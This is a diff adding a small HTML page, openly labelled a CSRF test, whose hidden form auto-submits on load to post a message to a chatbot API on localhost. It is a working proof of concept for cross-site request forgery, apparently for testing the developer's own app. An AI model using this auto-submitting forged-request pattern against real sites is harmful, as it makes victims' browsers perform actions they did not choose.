@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Test Page</title>
+</head>
+<body>
+    <h1>Testing for CSRF Vulnerability</h1>
+    <p>This page is attempting to send a message to your chatbot without your knowledge.</p>
+    
+    <form id="csrf-form" action="http://127.0.0.1:5000/api/chat" method="POST">
+        <input type="hidden" name="message" value="CSRF attack successful!">
+    </form>
+
+    <script>
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
